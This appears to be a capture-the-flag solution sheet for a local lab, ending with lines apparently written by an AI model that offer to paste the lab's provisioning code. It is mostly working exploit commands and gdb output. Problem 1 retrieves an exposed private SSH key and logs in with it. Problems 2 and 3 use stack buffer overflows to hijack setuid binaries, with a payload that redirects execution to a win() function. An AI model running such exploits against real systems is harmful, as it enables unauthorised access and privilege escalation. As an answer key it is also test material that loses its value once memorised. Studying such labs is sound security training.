# CMDs to hack the problems

## Problem 1
```bash
wget http://localhost:8000/backup/id_rsa
chmod 600 id_rsa
ssh -i id_rsa -p 2222 p1@localhost
```

## Problem 2
```bash
ls -l /home/p1/p2/p2        # should show rwsr-xr-x root root
file /home/p1/p2/p2         # should be ELF 64-bit, not PIE
nm -n /home/p1/p2/p2 | rg " win$"  # should show win() symbol

--- Generating the cyclic pattern ---
p1@vagrant:~$ python3 - <<'PY' > /tmp/pat
from pwn import cyclic
print(cyclic(300, n=8).decode())
PY

--- Running the program under gdb ---
p1@vagrant:~$ gdb -q /home/p1/p2/p2
Reading symbols from /home/p1/p2/p2...
(No debugging symbols found in /home/p1/p2/p2)
(gdb) run < /tmp/pat
Starting program: /home/p1/p2/p2 < /tmp/pat
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/aarch64-linux-gnu/libthread_db.so.1".
Enter input:

Program received signal SIGBUS, Bus error.
0x006161616161616a in ?? ()
(gdb)  info registers pc
pc             0x6161616161616a    0x6161616161616a

--- Using the value of pc from gdb output above ---
# That is the byte sequence:
# 6a 61 61 61 61 61 61 61  ->  b"jaaaaaaa"
p1@vagrant:~$ python3 - <<'PY'
from pwn import cyclic_find
print(cyclic_find(b"jaaaaaaa", n=8))
PY
72
--- Crafting the payload ---
python3 - <<'PY' > /tmp/payload
from pwn import p64
offset = 72
win = 0x400704
payload = b"A"*offset + p64(win) + b"\n"
import sys
sys.stdout.buffer.write(payload)
PY
--- Running the exploit ---
cat /tmp/payload - | /home/p1/p2/p2
id
ctf-extract P2
```

## Problem 3
```bash
p1@vagrant:~$ ls -l /home/p1/p3/p3        # should show rwsr-xr-x root root
-rwsr-xr-x 1 p3flag p3flag 9416 Feb  3 17:24 /home/p1/p3/p3
file /home/p1/p3/p3         # should be ELF 64-bit, not PIE
/home/p1/p3/p3: setuid ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, BuildID[sha1]=b7e58d69d743eb70f3a7e7efdfcba6cabb1b28d1, for GNU/Linux 3.7.0, not stripped
nm -n /home/p1/p3/p3 | grep " win$"  # should show win() symbol
000000000040081c t win
--- Generating the cyclic pattern ---
p1@vagrant:~$ python3 - <<'PY' > /tmp/pat
from pwn import cyclic
print(cyclic(300, n=8).decode())
PY

--- Running the program under gdb ---
p1@vagrant:~$ gdb -q /home/p1/p3/p3
Reading symbols from /home/p1/p3/p3...
(No debugging symbols found in /home/p1/p3/p3)
(gdb) run < /tmp/pat
Starting program: /home/p1/p3/p3 < /tmp/pat
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/aarch64-linux-gnu/libthread_db.so.1".
Say something:

Program received signal SIGBUS, Bus error.
0x006161616161616a in ?? ()
(gdb)  info registers pc
pc             0x6161616161616a    0x6161616161616a

--- Using the value of pc from gdb output above ---
p1@vagrant:~$ python3 - <<'PY'
from pwn import cyclic_find
pc_bytes = b"jaaaaaaa"  # replace with bytes from your PC value
print(cyclic_find(pc_bytes, n=8))
PY
72

--- Crafting the payload ---
python3 - <<'PY' > /tmp/p3_payload
from pwn import p64
offset = 72
win = 0x40081c   # replace with nm output
payload = b"A"*offset + p64(win) + b"\n"
open("/tmp/p3_payload","wb").write(payload)
PY

cat /tmp/p3_payload | /home/p1/p3/p3
ctf-extract P3
```

Reads and prints the flag from flag_p3.txt
Writes /opt/p3/solved (that’s the marker)
Exits cleanly
That’s how ctf-extract P3 later knows the exploit really happened.

You can see it directly in the provision script:

provision_p3.sh (the mark_solved() + win() functions)
If you want the exact snippet or want me to show the minimal C portion here, say the word and I’ll paste it.

